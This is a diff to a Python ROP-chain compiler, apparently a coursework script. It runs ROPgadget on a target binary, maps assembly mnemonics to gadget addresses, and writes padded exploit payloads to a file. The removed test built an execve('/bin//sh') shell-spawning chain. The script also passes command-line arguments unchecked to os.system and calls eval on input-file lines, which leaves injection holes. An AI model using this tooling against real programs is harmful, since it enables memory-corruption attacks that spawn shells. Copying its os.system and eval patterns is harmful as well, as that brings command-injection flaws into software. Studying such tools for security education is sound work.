@@ -1,4 +1,6 @@
 from struct import pack
+import sys
+import os
 
 NULL = b'\0\0\0\0'
 
@@ -20,14 +22,22 @@ WORD_TYPE = "dword"
 PACK_TYPE = "<I"
 
 
-def LoadGadgetDictionary(filename):
+def LoadGadgetDictionary(filename, dictionary):
     file = open(filename, "r")
     for line in file:
         vals = line.split(':')
         if len(vals) == 2:
             memoryLocation = vals[0].rstrip()
             gadget = vals[1].lstrip().rstrip('\n')
-            gadgetdictionary.update({gadget : memoryLocation})
+            dictionary.update({gadget : memoryLocation})
+
+def generalToBytes(value):
+    if type(value) is bytes:
+        return value
+    if type(value) is int:
+        return pack("<I", value)
+    if value is None:
+        return pack("<I", 0)
 
 def InitValues(bits):
     if bits == 32:
@@ -42,7 +52,7 @@ def InitValues(bits):
 def CreateROPChain(command, bufflength, gadgetfile, bits):
     global WORD_LEN, DATA_ADDRESS, A_REGISTER, ARG_START_REGISTER, ARG_END_REGISTER, STACK_BUILD_REGISTER, EXECVE_VALUE, SYSCALL, WORD_TYPE, PACK_TYPE
     
-    LoadGadgetDictionary(gadgetfile)
+    LoadGadgetDictionary(gadgetfile, gadgetdictionary)
     WORD_LEN, DATA_ADDRESS, A_REGISTER, ARG_START_REGISTER, ARG_END_REGISTER, STACK_BUILD_REGISTER, EXECVE_VALUE, SYSCALL, WORD_TYPE, PACK_TYPE = InitValues(bits)
 
     if command[0:6] == "execve":
@@ -53,6 +63,9 @@ def SplitListOnData(Gadgets):
     datavaluelocations = [idx + 1 for idx, val in enumerate(Gadgets) if type(val) is bytes]
     sections = [Gadgets[i:j] for i, j in zip([0] + datavaluelocations, datavaluelocations + ([len(Gadgets)] if datavaluelocations[-1] != len(Gadgets) else []))]
     return sections
+
+def dataaddressToValue(instruction):
+    return int(instruction.lstrip("@ .dat+") or 0)
 
 def ReplaceMissingGadget(gadget):
     return None
@@ -175,18 +188,86 @@ def A2R(instruction):
         return int.from_bytes(instruction, byteorder='little')
     return int(gadgetdictionary[instruction], 0)
 
+def AssemblyToGadget(instruction):
+    #Assembly string to Gadget Address
+    if type(instruction) is bytes:
+        return int.from_bytes(instruction, byteorder='little')
+    if type(instruction) is int:
+        return instruction
+    if instruction[0] == '@':
+        return dataaddressToValue(instruction)
+    return int(gadgetdictionary[instruction],0)
+
+def AssemblyListToGadgets(instructions, bufflength, dictionary, offset=0):
+    #Assumes guarantee that all instructions appear in dictionary
+    chain = b'A' * bufflength
+    missing = []
+
+    for instruction in instructions:
+        if type(instruction) is bytes:
+            chain += instruction
+            print("adding bytes   : <" + str(instruction) + ">")
+            continue
+
+        if instruction == SYSCALL:
+            chain += pack(PACK_TYPE, int(dictionary[SYSCALL],0))
+            print("adding syscall")
+            break
+
+        if type(instruction) is int:
+            chain += pack(PACK_TYPE, instruction)
+            print("adding address : <" + str(instruction) + ">")
+            continue
+
+        if instruction[0] == '@':
+            chain += generalToBytes(dataaddressToValue(instruction) + DATA_ADDRESS)
+            print("adding address : <" + str(instruction) + ">")
+            continue
+
+        if instruction not in dictionary:
+            print("missing gadget : <" + str(instruction) + ">")
+            missing.append(str(instruction))
+            continue
+        
+        if instruction in dictionary:
+            chain += pack(PACK_TYPE, int(dictionary[instruction],0) + offset)
+            print("adding gadget  : <" + instruction + "> @ " + dictionary[instruction])
+            continue 
+    print("missing gadgets:")
+    print(missing)
+    return chain
+
+def fileCheck(fileloc):
+    try:
+        f = open(fileloc, "r")
+        f.close()
+    except:
+        print("Could not open file " + fileloc + " for read")
+        quit()
 
 if __name__ == "__main__":
-    dummydict = {
-        "xor eax, eax" : 0x42424242,
-        "inc eax" : 0x43434343,
-        "int 0x80" : 0x44444444,
-        "pop eax" : 0x45454545,
-        "pop ebx" : 0x46464646,
-        "pop ecx" : 0x47474747,
-        "pop edx" : 0x48484848,
-        "@ .data" : 0x49494949,
-        "mov dword ptr [edx], eax" : 0x48484848,
-    }
-    gadgetdictionary.update(dummydict)
-    print(execve("/bin//sh", 44))
+
+    if len(sys.argv) < 3 or len(sys.argv) > 4:
+        print("Expected at least 2 arguments, got " + str(len(sys.argv)-1))
+        print("Correct Usage: python S3CW.py BinaryFileLocation ShellcodeFileLocation [Offset]")
+        quit()
+    fileCheck(sys.argv[1])
+    fileCheck(sys.argv[2])
+
+    dictionary = {}
+    os.system("ROPgadget --all --binary " + sys.argv[1] + " > rop.txt")
+    LoadGadgetDictionary("rop.txt", dictionary)
+    shellcode = []
+    shellfile = open(sys.argv[2], "r")
+    for line in shellfile:
+        if(line[0:2] == "b'" and line[-2] == "'"):
+            shellcode.append(eval(str(line).rstrip('\n')))
+        else:
+            shellcode.append(str(line).rstrip('\n'))
+    offset = 0
+    if len(sys.argv) == 4:
+        offset = int(sys.argv[3], 0)          
+    payload = AssemblyListToGadgets(shellcode, 0, dictionary, offset)
+
+    outfile = open("RopCompOut", "bw")
+    outfile.write(payload)
